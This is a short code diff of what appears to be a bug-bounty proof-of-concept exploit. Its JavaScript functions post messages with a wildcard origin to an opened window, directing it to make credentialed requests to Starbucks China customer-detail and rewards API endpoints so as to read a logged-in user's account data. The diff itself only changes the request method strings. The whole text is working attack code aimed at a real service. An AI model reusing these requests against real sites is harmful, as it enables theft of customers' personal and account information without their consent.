@@ -17,13 +17,13 @@ function openWin(){
 	}
 
 	function sendMessage(){
-var data = JSON.stringify({type:"HEAD",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
+var data = JSON.stringify({type:"get",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
 	h1Win.postMessage(data,"*");
         console.log("postmessage successed for account!")
 			}
 
 function sendMessage1(){
-var data = JSON.stringify({type:"GET",url:"https://profile.starbucks.com.cn/api/Customers/rewards?status=Total&pageNum=1&pageSize=100",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
+var data = JSON.stringify({type:"get",url:"https://profile.starbucks.com.cn/api/Customers/rewards?status=Total&pageNum=1&pageSize=100",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
 	h1Win.postMessage(data,"*");
         console.log("postmessage successed for customer!")
 			}
